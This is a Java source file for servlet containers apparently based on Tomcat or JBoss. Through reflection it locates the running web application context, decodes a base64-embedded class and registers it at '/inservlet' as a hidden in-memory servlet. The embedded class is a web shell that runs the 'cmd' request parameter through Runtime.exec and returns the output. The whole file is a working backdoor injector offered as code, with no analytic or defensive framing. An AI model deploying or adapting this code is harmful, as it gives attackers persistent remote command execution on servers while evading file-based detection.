package com.axisx;

import sun.misc.BASE64Decoder;

import javax.servlet.Servlet;
import javax.servlet.ServletException;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.util.List;

public class InjectServletByServlet extends HttpServlet {
    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
        Object StandardContext= null;
        String servletname="MyServlet";
        String urlPattern = "/inservlet";
        try{
            StandardContext = getContext();
            ClassLoader classLoader=Thread.currentThread().getContextClassLoader();
            String ServletBase64="yv66vgAAADMAhgoAGgBOCABPCwBQAFEKABkAUgsAUwBUCgBVAFYHAFcKAFgAWQoAWABaCgBbAFwHAF0KAAsAXgcAXwoADQBgBwBhCgAPAE4KAA0AYgcAYwoAEgBOCgASAGQIAGUKABIAZgoADwBnCgAPAGYHAGgHAGkBAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEAC0xNeVNlcnZsZXQ7AQAFZG9HZXQBAFIoTGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlcXVlc3Q7TGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlc3BvbnNlOylWAQAGcmVzdWx0AQASTGphdmEvbGFuZy9TdHJpbmc7AQAEdmFyNwEAFUxqYXZhL2xhbmcvRXhjZXB0aW9uOwEAA3JlcQEAJ0xqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXF1ZXN0OwEABHJlc3ABAChMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVzcG9uc2U7AQADY21kAQANU3RhY2tNYXBUYWJsZQcAaAcAagcAawcAbAcAVwEACkV4Y2VwdGlvbnMHAG0HAG4BAAtDb21tYW5kRXhlYwEAJihMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmc7AQACcnQBABNMamF2YS9sYW5nL1J1bnRpbWU7AQAEcHJvYwEAE0xqYXZhL2xhbmcvUHJvY2VzczsBAAZzdGRlcnIBABVMamF2YS9pby9JbnB1dFN0cmVhbTsBAANpc3IBABtMamF2YS9pby9JbnB1dFN0cmVhbVJlYWRlcjsBAAJicgEAGExqYXZhL2lvL0J1ZmZlcmVkUmVhZGVyOwEABGxpbmUBAAJzYgEAGExqYXZhL2xhbmcvU3RyaW5nQnVmZmVyOwcAbwcAcAcAcQcAXQcAXwcAYQEAB2Rlc3Ryb3kBAApTb3VyY2VGaWxlAQAOTXlTZXJ2bGV0LmphdmEMABsAHAEAB3NlcnZsZXQHAGoMAHIANwwANgA3BwBrDABzAHQHAHUMAHYAdwEAE2phdmEvbGFuZy9FeGNlcHRpb24HAG8MAHgAeQwAegB7BwBwDAB8AH0BABlqYXZhL2lvL0lucHV0U3RyZWFtUmVhZGVyDAAbAH4BABZqYXZhL2lvL0J1ZmZlcmVkUmVhZGVyDAAbAH8BABZqYXZhL2xhbmcvU3RyaW5nQnVmZmVyDACAAIEBABdqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcgwAggCDAQABCgwAhACBDACCAIUBAAlNeVNlcnZsZXQBAB5qYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXQBACVqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXF1ZXN0AQAmamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVzcG9uc2UBABBqYXZhL2xhbmcvU3RyaW5nAQAeamF2YXgvc2VydmxldC9TZXJ2bGV0RXhjZXB0aW9uAQATamF2YS9pby9JT0V4Y2VwdGlvbgEAEWphdmEvbGFuZy9SdW50aW1lAQARamF2YS9sYW5nL1Byb2Nlc3MBABNqYXZhL2lvL0lucHV0U3RyZWFtAQAMZ2V0UGFyYW1ldGVyAQAJZ2V0V3JpdGVyAQAXKClMamF2YS9pby9QcmludFdyaXRlcjsBABNqYXZhL2lvL1ByaW50V3JpdGVyAQAHcHJpbnRsbgEAFShMamF2YS9sYW5nL1N0cmluZzspVgEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7AQAOZ2V0SW5wdXRTdHJlYW0BABcoKUxqYXZhL2lvL0lucHV0U3RyZWFtOwEAGChMamF2YS9pby9JbnB1dFN0cmVhbTspVgEAEyhMamF2YS9pby9SZWFkZXI7KVYBAAhyZWFkTGluZQEAFCgpTGphdmEvbGFuZy9TdHJpbmc7AQAGYXBwZW5kAQAtKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZ0J1aWxkZXI7AQAIdG9TdHJpbmcBACwoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nQnVmZmVyOwAhABkAGgAAAAAABAABABsAHAABAB0AAAAvAAEAAQAAAAUqtwABsQAAAAIAHgAAAAYAAQAAAAoAHwAAAAwAAQAAAAUAIAAhAAAABAAiACMAAgAdAAAAuAACAAUAAAAhKxICuQADAgBOKi22AAQ6BCy5AAUBABkEtgAGpwAFOgSxAAEACQAbAB4ABwADAB4AAAAaAAYAAAANAAkAEAAQABEAGwATAB4AEgAgABUAHwAAAD4ABgAQAAsAJAAlAAQAIAAAACYAJwAEAAAAIQAgACEAAAAAACEAKAApAAEAAAAhACoAKwACAAkAGAAsACUAAwAtAAAAGQAC/wAeAAQHAC4HAC8HADAHADEAAQcAMgEAMwAAAAYAAgA0ADUAAQA2ADcAAgAdAAABKQADAAkAAABguAAITSwrtgAJTi22AAo6BLsAC1kZBLcADDoFuwANWRkFtwAOOgYBOge7AA9ZtwAQOggZBrYAEVk6B8YAIBkIuwASWbcAExkHtgAUEhW2ABS2ABa2ABdXp//bGQi2ABiwAAAAAwAeAAAAKgAKAAAAGAAEABkACgAaABAAGwAbABwAJgAdACkAHgAyACAAPQAhAFoAJAAfAAAAXAAJAAAAYAAgACEAAAAAAGAALAAlAAEABABcADgAOQACAAoAVgA6ADsAAwAQAFAAPAA9AAQAGwBFAD4APwAFACYAOgBAAEEABgApADcAQgAlAAcAMgAuAEMARAAIAC0AAAAlAAL/ADIACQcALgcAMQcARQcARgcARwcASAcASQcAMQcASgAAJwAzAAAABAABAAcAAQBLABwAAQAdAAAAKwAAAAEAAAABsQAAAAIAHgAAAAYAAQAAACgAHwAAAAwAAQAAAAEAIAAhAAAAAQBMAAAAAgBN";
            byte[] ServletClass = new BASE64Decoder().decodeBuffer(ServletBase64);

            Method defineClass1 = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
            defineClass1.setAccessible(true);
            Class servletClass = (Class) defineClass1.invoke(classLoader, ServletClass, 0, ServletClass.length);
            Servlet servletObject=(Servlet)servletClass.newInstance();

            Method m0=StandardContext.getClass().getDeclaredMethod("createWrapper");
            m0.setAccessible(true);
            Object StandardWrapper=m0.invoke(StandardContext);

            // Wrapper
            Class<?> Wrapper=classLoader.loadClass("org.apache.catalina.Wrapper");
            Class<?> InstanceSupportCls=classLoader.loadClass("org.apache.catalina.util.InstanceSupport");
            Constructor InstanceSupportCons=InstanceSupportCls.getConstructor(Wrapper);
            InstanceSupportCons.setAccessible(true);
            Object InstanceSupport=InstanceSupportCons.newInstance(StandardWrapper);

            Field f = StandardWrapper.getClass().getDeclaredField("instanceSupport"); //different, class in jbossweb.jar
            f.setAccessible(true);
            f.set(StandardWrapper, InstanceSupport);
            Method m11=StandardWrapper.getClass().getSuperclass().getDeclaredMethod("setName",String.class);
            m11.setAccessible(true);
            m11.invoke(StandardWrapper,servletname);

            Method m12=StandardWrapper.getClass().getDeclaredMethod("setEnabled",boolean.class); //different
            m12.setAccessible(true);
            m12.invoke(StandardWrapper,true);

            Method m1=StandardWrapper.getClass().getDeclaredMethod("setServletName",String.class);
            m1.setAccessible(true);
            m1.invoke(StandardWrapper,servletname);

            Method m2=StandardWrapper.getClass().getDeclaredMethod("setServletClass",String.class);
            m2.setAccessible(true);
            m2.invoke(StandardWrapper,servletClass.getName());

            Method m3=StandardWrapper.getClass().getDeclaredMethod("setServlet", Servlet.class);
            m3.setAccessible(true);
            m3.invoke(StandardWrapper,servletObject);

            Class<?> ContainerClass=classLoader.loadClass("org.apache.catalina.Container");
            Method m5=StandardContext.getClass().getDeclaredMethod("addChild",ContainerClass);
            m5.setAccessible(true);
            m5.invoke(StandardContext,StandardWrapper);

            Method m4=StandardContext.getClass().getDeclaredMethod("addServletMapping",String.class,String.class);
            m4.setAccessible(true);
            m4.invoke(StandardContext,urlPattern,servletname);

            Field lifecycleFiled = StandardContext.getClass().getSuperclass().getDeclaredField("lifecycle");
            lifecycleFiled.setAccessible(true);
            Object lifecycle = lifecycleFiled.get(StandardContext); //LifecycleSupport, different

            Method m6=lifecycle.getClass().getDeclaredMethod("fireLifecycleEvent",String.class,Object.class);
            m6.setAccessible(true);
            m6.invoke(lifecycle,"complete-config", (Object)null);
        } catch (Exception e){e.printStackTrace();}
    }


    public Object getContext() throws NoSuchFieldException, IllegalAccessException, NoSuchMethodException, InvocationTargetException {
        ThreadGroup threadGroup=Thread.currentThread().getThreadGroup();
        Field field=threadGroup.getClass().getDeclaredField("threads");
        field.setAccessible(true);
        Thread[] threads=(Thread[])field.get(threadGroup);
        for(Thread thread:threads) {
            if (thread.getName().contains("Acceptor") && thread.getName().contains("http")) {
                Field tfield = thread.getClass().getDeclaredField("target");
                tfield.setAccessible(true);
                Object JioEndpoint$ = tfield.get(thread);
                Field thisField = JioEndpoint$.getClass().getDeclaredField("this$0");
                thisField.setAccessible(true);
                Object JioEndpointO = thisField.get(JioEndpoint$);
                Field handlerField = JioEndpointO.getClass().getDeclaredField("handler");
                ;
                handlerField.setAccessible(true);
                Object Http11Protocol = handlerField.get(JioEndpointO);
                Field globalField = Http11Protocol.getClass().getDeclaredField("global");
                globalField.setAccessible(true);
                Object RequestGroupInof = globalField.get(Http11Protocol);
                Field f2 = RequestGroupInof.getClass().getDeclaredField("processors");
                f2.setAccessible(true);
                List Processors = (List) f2.get(RequestGroupInof);
                for (int i = 0; i < Processors.size(); i++) {
                    Object RequestInfo = (Object) Processors.get(i);
                    Field f3 = RequestInfo.getClass().getDeclaredField("req");
                    f3.setAccessible(true);
                    Object Request = f3.get(RequestInfo);
                    Object Request1 = Request.getClass().getDeclaredMethod("getNote", Integer.TYPE).invoke(Request, 1);
                    Field f4 = Request1.getClass().getDeclaredField("context");
                    f4.setAccessible(true);
                    Object StandardContext = f4.get(Request1);
                    if (StandardContext != null) {
                        return StandardContext;
                    }
                }
            }
        }
        return null;
    }
}

